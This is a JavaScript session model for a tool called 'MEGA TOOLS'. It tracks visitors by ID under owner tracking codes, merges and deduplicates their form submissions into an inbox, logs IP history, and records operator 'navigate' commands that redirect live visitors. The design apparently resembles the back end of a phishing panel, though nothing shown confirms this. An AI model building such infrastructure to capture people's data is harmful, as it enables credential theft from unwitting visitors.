// ============================================================
// MEGA TOOLS — SESSION MODEL (LOCAL JSON v8.5)
// HYBRID MongoDB + JSON compatible
// ENTERPRISE: Tracking code validation, duplicate submission guard
// ============================================================
// LOGIC: visitorId = UNIQUE IDENTITY (one session per visitor, forever)
//        trackingCode = HISTORY (kept as array of codes per session)
//        IP = History Only — NEVER used for matching
//        Session.upsert() = ONE & ONLY Gatekeeper for Identity/Data
//
// FIX S1..S16: retained from v8.3
// FIX S17 (v8.5 — SUBSET/SUPERSET MERGE): mergeSubmissionIntoSession
//   now treats partial↔full submissions as ONE logical submission:
//     • Exact fingerprint match anywhere → SKIP (no push).
//     • Incoming payload is a SUPERSET of an existing submission
//       (has all of that submission's keys + more) → REPLACE that
//       submission in its original slot with the fuller payload.
//     • Incoming payload is a SUBSET of an existing submission
//       (its keys are all present in an existing one) → SKIP
//       (partial re-submit of data already held).
//     • Same-key-set with different values → APPEND (genuinely
//       distinct submission).
//     • Disjoint keys → APPEND.
//   Result: 3 submissions where 2 are partial→full evolutions of
//   the same logical form now collapse to 1 submission card in the
//   inbox. Different submissions still separate.
// FIX S18 (v8.5): userKeys() + isKeySubset() helpers added for the
//   subset/superset check above.
// FIX S19 (v8.5): isSupersetOrSubset() exported helper — used by
//   data.js route to detect partial↔full evolution when computing
//   `wasDuplicate`, so the socket-emitted formSubmitted event can
//   already carry duplicate=true and prevent a momentary UI flash
//   of a duplicate card before backend merge reconciles.
// ============================================================

const db = require('../database');
const { toStringId, generateId, now } = require('../utils/helpers');
const CONFIG = require('../config');

// ============================================================
// CONSTANTS
// ============================================================

const SESSION_EXPIRY_MS = 7 * 24 * 60 * 60 * 1000; // 7 days
const SYSTEM_FIELDS = ['step','stepNumber','attempt','status','collectedTypes','screenResolution','timestamp','userAgent','platform','language','timezone','submittedAt','source','url','currentUrl','entryUrl','browser'];

let validTcCache = null;
let validTcCacheExpiry = 0;
const VALID_TC_TTL_MS = 30000;

// Kept for backward-compat / logging only.
const RAPID_DUPLICATE_WINDOW_MS = 2000;

// ============================================================
// FIX S5: PER-VISITOR MUTEX (in-process)
// ============================================================

const upsertLocks = new Map();

function lockKey(visitorId, trackingCode) {
  return `${visitorId || 'nov'}::${trackingCode || 'notc'}`;
}

async function withLock(key, fn) {
  while (upsertLocks.get(key)) {
    await new Promise(r => setTimeout(r, 10));
  }
  upsertLocks.set(key, true);
  try {
    return await fn();
  } finally {
    upsertLocks.delete(key);
  }
}

// ============================================================
// VALIDATION — real user trackingCodes
// ============================================================

async function getValidTrackingCodes() {
  try {
    if (validTcCache && validTcCacheExpiry > Date.now()) {
      return validTcCache;
    }
    const allUsers = await db.users.read();
    const codes = new Set();
    for (const u of allUsers) {
      if (u.trackingCode) codes.add(u.trackingCode);
    }
    validTcCache = codes;
    validTcCacheExpiry = Date.now() + VALID_TC_TTL_MS;
    return codes;
  } catch (err) {
    console.error('[Session] getValidTrackingCodes error:', err.message);
    return new Set();
  }
}

function extractOwnerCode(trackingCode) {
  if (!trackingCode || typeof trackingCode !== 'string') return '';
  const idx = trackingCode.indexOf('_');
  return idx > 0 ? trackingCode.substring(0, idx) : trackingCode;
}

async function isTrackingCodeValid(trackingCode) {
  if (!trackingCode || typeof trackingCode !== 'string') return false;
  const ownerCode = extractOwnerCode(trackingCode);
  if (!ownerCode) return false;
  const validCodes = await getValidTrackingCodes();
  return validCodes.has(ownerCode);
}

// ============================================================
// SUBMISSION FINGERPRINT — deterministic content hash
// ============================================================

function buildSubmissionFingerprint(formData) {
  if (!formData || typeof formData !== 'object') return '';
  const clean = {};
  const keys = Object.keys(formData).filter(k => !SYSTEM_FIELDS.includes(k) && k !== 'submittedAt').sort();
  for (const k of keys) {
    const v = formData[k];
    if (v === undefined || v === null || v === '') continue;
    clean[k] = String(v).trim();
  }
  try { return JSON.stringify(clean); } catch { return ''; }
}

function isDuplicateSubmission(existingSubmissions, formData) {
  if (!Array.isArray(existingSubmissions) || existingSubmissions.length === 0) return false;
  const newFP = buildSubmissionFingerprint(formData);
  if (!newFP || newFP === '{}') return false;
  return existingSubmissions.some(sub => buildSubmissionFingerprint(sub) === newFP);
}

// ============================================================
// FIX S18 (v8.5): userKeys + isKeySubset helpers
// ============================================================

// Return the sorted non-system, non-submittedAt keys of a submission.
function userKeys(obj) {
  if (!obj || typeof obj !== 'object') return [];
  return Object.keys(obj)
    .filter(k => !SYSTEM_FIELDS.includes(k) && k !== 'submittedAt')
    .sort();
}

// True if every key in `small` exists in `big`.
function isKeySubset(small, big) {
  if (!Array.isArray(small) || !Array.isArray(big)) return false;
  if (small.length === 0) return false;
  const set = new Set(big);
  return small.every(k => set.has(k));
}

// ============================================================
// FIX S19 (v8.5): isSupersetOrSubset — public helper for routes
// ============================================================
// Returns true if `formData` is either a strict superset or a strict
// subset (by key set) of ANY existing submission — i.e. it represents
// a partial↔full evolution of an already-known submission.
// Same-key-set submissions (different values) return false because
// those are genuinely distinct submissions and should not be flagged.
function isSupersetOrSubset(existingSubmissions, formData) {
  if (!Array.isArray(existingSubmissions) || existingSubmissions.length === 0) return false;
  const incomingKeys = userKeys(formData);
  if (incomingKeys.length === 0) return false;

  return existingSubmissions.some(sub => {
    const existingKeys = userKeys(sub);
    if (existingKeys.length === 0) return false;

    const sameKeySet =
      existingKeys.length === incomingKeys.length &&
      existingKeys.every((k, j) => k === incomingKeys[j]);
    if (sameKeySet) return false;

    // Incoming superset of existing OR incoming subset of existing
    return isKeySubset(existingKeys, incomingKeys) || isKeySubset(incomingKeys, existingKeys);
  });
}

// ============================================================
// FIX S16 + S17 (v8.5): FULL-CONTENT + SUBSET/SUPERSET GUARDED APPEND
// ============================================================

function mergeSubmissionIntoSession(session, incomingFormData) {
  if (!incomingFormData || typeof incomingFormData !== 'object') return false;
  const incomingKeys = userKeys(incomingFormData);
  if (incomingKeys.length === 0) return false;

  const incomingFP = buildSubmissionFingerprint(incomingFormData);
  const subs = session.submissions || [];

  // 1) Exact fingerprint match anywhere → skip
  if (incomingFP && isDuplicateSubmission(subs, incomingFormData)) {
    return false;
  }

  // 2) Subset / superset detection vs each existing submission
  for (let i = 0; i < subs.length; i++) {
    const existing = subs[i];
    const existingKeys = userKeys(existing);
    if (existingKeys.length === 0) continue;

    const sameKeySet =
      existingKeys.length === incomingKeys.length &&
      existingKeys.every((k, j) => k === incomingKeys[j]);
    if (sameKeySet) continue; // same keys, different values → fall through to append

    // Incoming is a SUPERSET of existing → replace existing with incoming
    if (isKeySubset(existingKeys, incomingKeys)) {
      subs[i] = { ...incomingFormData, submittedAt: now() };
      session.submissions = subs;
      session.formData = session.formData || {};
      session.lockedKeys = session.lockedKeys || [];
      incomingKeys.forEach(k => {
        session.formData[k] = incomingFormData[k];
        if (!session.lockedKeys.includes(k)) session.lockedKeys.push(k);
      });
      return true; // treated as an update, not a new submission
    }

    // Incoming is a SUBSET of existing → skip (partial re-submit)
    if (isKeySubset(incomingKeys, existingKeys)) {
      return false;
    }
  }

  // 3) Otherwise → append as new submission
  session.submissions = subs;
  session.submissions.push({ ...incomingFormData, submittedAt: now() });

  session.formData = session.formData || {};
  session.lockedKeys = session.lockedKeys || [];
  incomingKeys.forEach(k => {
    session.formData[k] = incomingFormData[k];
    if (!session.lockedKeys.includes(k)) session.lockedKeys.push(k);
  });

  return true;
}

// ============================================================
// FIX S11: consolidateByVisitor() — merge duplicate sessions
// ============================================================

function unionArray(a, b) {
  if (!Array.isArray(a)) a = [];
  if (!Array.isArray(b)) b = [];
  return [...new Set([...a, ...b])];
}

// FIX S15 + S17: dedupe by fingerprint AND collapse partial/full
// pairs into the fuller entry (chronological order preserved).
function unionSubmissions(a, b) {
  if (!Array.isArray(a)) a = [];
  if (!Array.isArray(b)) b = [];
  const merged = [...a, ...b];
  merged.sort((x, y) => new Date(x.submittedAt || 0) - new Date(y.submittedAt || 0));

  const out = [];
  for (const sub of merged) {
    const keys = userKeys(sub);
    if (keys.length === 0) continue;
    const fp = buildSubmissionFingerprint(sub);

    let folded = false;
    for (let i = 0; i < out.length; i++) {
      const prev = out[i];
      const prevKeys = userKeys(prev);
      const prevFp = buildSubmissionFingerprint(prev);

      // Exact duplicate → skip entirely
      if (fp && fp === prevFp) { folded = true; break; }

      const sameKeySet =
        prevKeys.length === keys.length &&
        prevKeys.every((k, j) => k === keys[j]);
      if (sameKeySet) continue; // same shape, different values → keep both

      // New is superset of prev → replace prev
      if (isKeySubset(prevKeys, keys)) {
        out[i] = sub;
        folded = true;
        break;
      }
      // New is subset of prev → drop new
      if (isKeySubset(keys, prevKeys)) {
        folded = true;
        break;
      }
    }
    if (!folded) out.push(sub);
  }
  return out;
}

async function consolidateByVisitor() {
  try {
    const all = await db.sessions.read();
    if (!Array.isArray(all) || all.length === 0) return { merged: 0, groups: 0 };

    const groups = new Map();
    for (const s of all) {
      const vid = s.visitorId;
      if (!vid) continue;
      if (!groups.has(vid)) groups.set(vid, []);
      groups.get(vid).push(s);
    }

    let mergedCount = 0;
    let groupsWithDup = 0;
    const updates = new Map();

    for (const [visitorId, group] of groups.entries()) {
      const visible = group.filter(s => !s.hiddenForAll);
      if (visible.length <= 1) {
        if (visible.length === 1) {
          const solo = visible[0];
          const deduped = unionSubmissions(solo.submissions || [], []);
          if (deduped.length !== (solo.submissions || []).length) {
            updates.set(String(solo._id), { ...solo, submissions: deduped, updated_at: now() });
          }
        }
        continue;
      }
      groupsWithDup++;

      visible.sort((a, b) => {
        const aSubs = (a.submissions || []).length;
        const bSubs = (b.submissions || []).length;
        if (aSubs !== bSubs) return bSubs - aSubs;
        return new Date(b.lastActivity || b.updated_at || 0).getTime()
             - new Date(a.lastActivity || a.updated_at || 0).getTime();
      });

      const survivor = { ...visible[0] };
      const others = visible.slice(1);

      let allSubs = survivor.submissions || [];
      let allTcHistory = survivor.trackingCodeHistory || [];
      let allCollected = survivor.collectedTypes || [];
      let allIps = survivor.ipHistory || [];
      let allRedirects = survivor.redirectHistory || [];
      let allLocked = survivor.lockedKeys || [];
      let maxClicks = survivor.clicks || 0;

      for (const other of others) {
        allSubs = unionSubmissions(allSubs, other.submissions || []);
        allTcHistory = unionArray(allTcHistory, other.trackingCodeHistory || []);
        if (other.trackingCode && !allTcHistory.includes(other.trackingCode)) {
          allTcHistory.push(other.trackingCode);
        }
        allCollected = unionArray(allCollected, other.collectedTypes || []);
        allIps = [...allIps, ...(other.ipHistory || [])];
        allRedirects = [...allRedirects, ...(other.redirectHistory || [])];
        allLocked = unionArray(allLocked, other.lockedKeys || []);
        maxClicks = Math.max(maxClicks, other.clicks || 0);
      }

      allSubs = unionSubmissions(allSubs, []);

      survivor.submissions = allSubs;
      survivor.trackingCodeHistory = allTcHistory;
      survivor.collectedTypes = allCollected;
      survivor.ipHistory = allIps;
      survivor.redirectHistory = allRedirects;
      survivor.lockedKeys = allLocked;
      survivor.clicks = maxClicks;
      survivor.updated_at = now();

      if (allSubs.length > 0) {
        const latest = allSubs[allSubs.length - 1];
        survivor.formData = survivor.formData || {};
        allLocked.forEach(k => {
          if (latest[k] !== undefined) survivor.formData[k] = latest[k];
        });
      }

      updates.set(String(survivor._id), survivor);

      for (const other of others) {
        updates.set(String(other._id), {
          ...other,
          hiddenForAll: true,
          hiddenAt: now(),
          hiddenReason: 'consolidated-by-visitor',
          consolidatedInto: String(survivor._id),
          updated_at: now(),
        });
        mergedCount++;
      }
    }

    if (updates.size === 0) {
      console.log('[Session] consolidateByVisitor: no duplicates found');
      return { merged: 0, groups: 0 };
    }

    const updatedAll = all.map(s => {
      const key = String(s._id);
      return updates.has(key) ? updates.get(key) : s;
    });

    await db.sessions.write(updatedAll);
    console.log(`[Session] ✅ consolidateByVisitor: merged ${mergedCount} duplicate sessions across ${groupsWithDup} visitor groups`);
    return { merged: mergedCount, groups: groupsWithDup };
  } catch (err) {
    console.error('[Session] consolidateByVisitor error:', err.message);
    return { merged: 0, groups: 0, error: err.message };
  }
}

// ============================================================
// CREATE
// ============================================================

async function create(data) {
  try {
    const nowISO = now();

    const lockedKeys = [];
    const initialFormData = {};
    if (data.formData && Object.keys(data.formData).length > 0) {
      const keys = Object.keys(data.formData).filter(k => !SYSTEM_FIELDS.includes(k) && k !== 'submittedAt');
      for (let i = 0; i < keys.length; i++) {
        lockedKeys.push(keys[i]);
        initialFormData[keys[i]] = data.formData[keys[i]];
      }
    }

    const firstSubmission = data.formData && Object.keys(data.formData).length > 0
      ? [{ ...data.formData, submittedAt: nowISO }]
      : [];

    const isOffline = data.status === 'Offline';
    const initialTc = data.trackingCode || 'unknown';

    const session = {
      _id: generateId('s'),
      visitorId: data.visitorId || null,
      trackingCode: initialTc,
      trackingCodeHistory: initialTc ? [initialTc] : [],
      baseCode: data.baseCode || '',
      linkId: toStringId(data.linkId) || null,
      ip: data.ip || '::1',
      ipHistory: data.ip ? [{ ip: data.ip, timestamp: nowISO }] : [],
      browser: (data.browser || '').substring(0, 500),
      deviceType: data.deviceType || 'Desktop',
      entryUrl: data.entryUrl || data.baseCode || '',
      currentUrl: data.currentUrl || '',
      status: isOffline ? 'Offline' : 'Online',
      isLive: !isOffline,
      clicks: data.clicks || 1,
      collectedTypes: data.collectedTypes || [],
      submissions: firstSubmission,
      formData: initialFormData,
      lockedKeys: lockedKeys,
      hiddenBy: [],
      hiddenFor: [],
      hiddenForAll: false,
      redirectHistory: [],
      identitySource: 'created',
      lastActivity: nowISO,
      timestamp: nowISO,
      created_at: nowISO,
      updated_at: nowISO,
    };

    const all = await db.sessions.read();
    if (data.visitorId) {
      const alreadyExists = all.find(s => s.visitorId === data.visitorId && !s.hiddenForAll);
      if (alreadyExists) return alreadyExists;
    }
    all.unshift(session);
    await db.sessions.write(all);
    return session;
  } catch (error) {
    console.error('[Session] create error:', error.message);
    throw new Error(`Failed to create session: ${error.message}`);
  }
}

async function createAtomic(data) {
  const key = lockKey(data.visitorId, data.trackingCode);
  return await withLock(key, () => create(data));
}

// ============================================================
// FIND
// ============================================================

async function findById(id) {
  try {
    return await db.sessions.findById(id);
  } catch (error) {
    console.error('[Session] findById error:', error.message);
    throw new Error(`Failed to find session: ${error.message}`);
  }
}

async function findByVisitorId(visitorId) {
  try {
    if (!visitorId) return null;
    const all = await db.sessions.read();
    return all.find(s => s.visitorId === visitorId && !s.hiddenForAll) || null;
  } catch (error) {
    console.error('[Session] findByVisitorId error:', error.message);
    throw new Error(`Failed to find session by visitor ID: ${error.message}`);
  }
}

async function findForCommandLookup(visitorId, trackingCode) {
  try {
    const all = await db.sessions.read();
    if (visitorId) {
      const byVid = all.find(s => s.visitorId === visitorId && !s.hiddenForAll);
      if (byVid) return byVid;
    }
    if (trackingCode) {
      const tc = trackingCode.includes('_') ? trackingCode.split('_')[0] : trackingCode;
      const byTc = all.find(s => {
        if (s.hiddenForAll) return false;
        const sCode = s.trackingCode ? (s.trackingCode.includes('_') ? s.trackingCode.split('_')[0] : s.trackingCode) : '';
        if (sCode === tc) return true;
        if (Array.isArray(s.trackingCodeHistory)) {
          return s.trackingCodeHistory.some(h => {
            const hc = h.includes('_') ? h.split('_')[0] : h;
            return hc === tc;
          });
        }
        return false;
      });
      if (byTc) return byTc;
    }
    return null;
  } catch (error) {
    console.error('[Session] findForCommandLookup error:', error.message);
    return null;
  }
}

async function findMany(filters = {}) {
  try {
    let sessions = await db.sessions.read();

    if (filters.isLive !== undefined) sessions = sessions.filter(s => s.isLive === filters.isLive);
    if (filters.status) sessions = sessions.filter(s => s.status === filters.status);
    if (filters.deviceType) sessions = sessions.filter(s => s.deviceType === filters.deviceType);
    if (filters.visitorId) sessions = sessions.filter(s => s.visitorId === filters.visitorId);
    if (filters.trackingCode) {
      const code = extractOwnerCode(filters.trackingCode);
      sessions = sessions.filter(s => {
        if (extractOwnerCode(s.trackingCode) === code) return true;
        if (Array.isArray(s.trackingCodeHistory)) {
          return s.trackingCodeHistory.some(h => extractOwnerCode(h) === code);
        }
        return false;
      });
    }
    if (filters.ip) sessions = sessions.filter(s => s.ip === filters.ip);

    sessions.sort((a, b) => {
      if (a.isLive && !b.isLive) return -1;
      if (!a.isLive && b.isLive) return 1;
      return new Date(b.timestamp) - new Date(a.timestamp);
    });

    return sessions;
  } catch (error) {
    console.error('[Session] findMany error:', error.message);
    throw new Error(`Failed to find sessions: ${error.message}`);
  }
}

// ============================================================
// UPSERT — GATEKEEPER
// ============================================================

async function _upsertInner(data) {
  const clientIp = data.ip || '::1';
  const visitorId = data.visitorId || null;
  const trackingCode = data.trackingCode || null;

  if (trackingCode) {
    const valid = await isTrackingCodeValid(trackingCode);
    if (!valid) {
      console.warn('[Session] REJECTED invalid trackingCode:', trackingCode);
      return { session: null, isNew: false, matchType: 'rejected' };
    }
  }

  if (!visitorId) {
    console.warn('[Session] REJECTED null visitorId for tc:', trackingCode);
    return { session: null, isNew: false, matchType: 'rejected_no_visitor' };
  }

  const all = await db.sessions.read();

  const visibleMatches = all.filter(s => s.visitorId === visitorId && !s.hiddenForAll);
  if (visibleMatches.length > 1) {
    try { await consolidateByVisitor(); } catch (_) {}
  }

  let existing = visibleMatches.find(s => !s.hiddenForAll) || null;
  if (!existing && visibleMatches.length > 0) existing = visibleMatches[0];

  let matchType = 'visitorId';

  if (existing) {
    const createdTime = new Date(existing.created_at || existing.timestamp).getTime();
    if (Date.now() - createdTime >= SESSION_EXPIRY_MS) {
      existing = null;
      matchType = 'expired';
    }
  }

  if (existing) {
    if (visitorId && !existing.visitorId) existing.visitorId = visitorId;

    if (trackingCode && trackingCode !== existing.trackingCode) {
      existing.trackingCodeHistory = existing.trackingCodeHistory || [];
      if (existing.trackingCode && !existing.trackingCodeHistory.includes(existing.trackingCode)) {
        existing.trackingCodeHistory.push(existing.trackingCode);
      }
      if (!existing.trackingCodeHistory.includes(trackingCode)) {
        existing.trackingCodeHistory.push(trackingCode);
      }
      existing.trackingCode = trackingCode;
    }

    existing.currentUrl = data.currentUrl || existing.currentUrl;

    if (data.status === 'Offline') {
      existing.isLive = false;
      existing.status = 'Offline';
    } else if (data.status === 'Active' || !data.status) {
      existing.isLive = true;
      if (existing.status === 'Offline') existing.status = 'Online';
    }

    existing.lastActivity = now();
    existing.identitySource = matchType;

    if (clientIp && clientIp !== existing.ip) {
      existing.ipHistory = existing.ipHistory || [];
      existing.ipHistory.push({ ip: clientIp, timestamp: now() });
      existing.ip = clientIp;
    }

    const skipClickTypes = ['heartbeat', 'session_init'];
    const hasOnlySystemTypes = data.collectedTypes?.length > 0 &&
      data.collectedTypes.every(t => skipClickTypes.includes(t));
    if (!hasOnlySystemTypes) existing.clicks = (existing.clicks || 0) + 1;

    if (data.linkId) existing.linkId = toStringId(data.linkId);
    if (data.baseCode) existing.baseCode = data.baseCode;
    if (data.entryUrl) existing.entryUrl = data.entryUrl;
    if (data.collectedTypes?.length > 0) {
      existing.collectedTypes = [...new Set([...(existing.collectedTypes || []), ...data.collectedTypes])];
    }

    if (data.formData && Object.keys(data.formData).length > 0) {
      const added = mergeSubmissionIntoSession(existing, data.formData);
      if (!added) {
        console.log('[Session] Duplicate / subset submission skipped for session:', existing._id);
      }
    }

    if (data.browser) existing.browser = data.browser.substring(0, 500);
    if (data.deviceType) existing.deviceType = data.deviceType;
    existing.updated_at = now();

    await db.sessions.findByIdAndUpdate(existing._id, existing);
    return { session: existing, isNew: false, matchType };
  }

  const session = await create({ ...data, identitySource: 'created' });
  return { session, isNew: true, matchType: 'created' };
}

async function upsert(data) {
  try {
    const key = lockKey(data.visitorId, data.trackingCode);
    return await withLock(key, () => _upsertInner(data));
  } catch (error) {
    console.error('[Session] upsert error:', error.message);
    throw new Error(`Failed to upsert session: ${error.message}`);
  }
}

// ============================================================
// UPDATE
// ============================================================

async function update(id, updates) {
  try {
    const safeUpdates = { ...updates };
    delete safeUpdates._id;
    safeUpdates.lastActivity = now();
    safeUpdates.updated_at = now();
    return await db.sessions.findByIdAndUpdate(id, safeUpdates);
  } catch (error) {
    console.error('[Session] update error:', error.message);
    throw new Error(`Failed to update session: ${error.message}`);
  }
}

// ============================================================
// DELETE
// ============================================================

async function remove(id) {
  try {
    return await db.sessions.findByIdAndDelete(id);
  } catch (error) {
    console.error('[Session] remove error:', error.message);
    throw new Error(`Failed to delete session: ${error.message}`);
  }
}

// ============================================================
// PRESENCE UPDATE
// ============================================================

async function updatePresence(id, updates) {
  try {
    const allowedFields = ['status', 'isLive', 'lastActivity'];
    const safeUpdates = {};
    for (const key of allowedFields) {
      if (updates[key] !== undefined) safeUpdates[key] = updates[key];
    }
    if (Object.keys(safeUpdates).length === 0) return null;
    safeUpdates.updated_at = now();
    return await db.sessions.findByIdAndUpdate(id, safeUpdates);
  } catch (error) {
    console.error('[Session] updatePresence error:', error.message);
    throw new Error(`Failed to update presence: ${error.message}`);
  }
}

// ============================================================
// COMMAND RECORD
// ============================================================

async function recordCommand(id, commandData) {
  try {
    const session = await db.sessions.findById(id);
    if (!session) return null;

    session.commandSeq = (session.commandSeq || 0) + 1;
    session.lastCommand = commandData.action || 'navigate';
    session.lastCommandUrl = commandData.url || '';
    session.lastMessage = commandData.message || '';
    session.lastActivity = now();
    session.redirectHistory = session.redirectHistory || [];
    session.redirectHistory.push({
      action: commandData.action || 'navigate',
      url: commandData.url || '',
      message: commandData.message || '',
      seq: session.commandSeq,
      timestamp: now()
    });

    if (commandData.url) {
      session.currentUrl = commandData.url;
      session.clicks = (session.clicks || 0) + 1;
    }

    session.updated_at = now();
    await db.sessions.findByIdAndUpdate(id, session);
    return session;
  } catch (error) {
    console.error('[Session] recordCommand error:', error.message);
    throw new Error(`Failed to record command: ${error.message}`);
  }
}

async function hideFromUser(id, userId) {
  try {
    const session = await db.sessions.findById(id);
    if (!session) return null;

    session.hiddenFor = session.hiddenFor || [];
    if (!session.hiddenFor.includes(toStringId(userId))) {
      session.hiddenFor.push(toStringId(userId));
    }
    await db.sessions.findByIdAndUpdate(id, session);
    return session;
  } catch (error) {
    console.error('[Session] hideFromUser error:', error.message);
    throw new Error(`Failed to hide session from user: ${error.message}`);
  }
}

async function count(filters = {}) {
  try {
    return await db.sessions.count(filters);
  } catch (error) {
    console.error('[Session] count error:', error.message);
    throw new Error(`Failed to count sessions: ${error.message}`);
  }
}

async function isSessionLive(session) {
  try {
    if (!session || !session.lastActivity) return false;
    const elapsed = Date.now() - new Date(session.lastActivity).getTime();
    return session.status === 'Online' && elapsed < CONFIG.SESSION_TIMEOUT_MS;
  } catch (error) {
    console.error('[Session] isSessionLive error:', error.message);
    return false;
  }
}

// ============================================================
// EXPORT
// ============================================================

module.exports = {
  create, createAtomic, findById, findByVisitorId, findForCommandLookup, findMany,
  upsert, update, remove, hideFromUser,
  count, isSessionLive,
  updatePresence,
  recordCommand,
  isTrackingCodeValid,
  getValidTrackingCodes,
  isDuplicateSubmission,
  buildSubmissionFingerprint,
  consolidateByVisitor,
  // FIX S19 (v8.5): public helpers for route-level duplicate detection
  userKeys,
  isKeySubset,
  isSupersetOrSubset,
};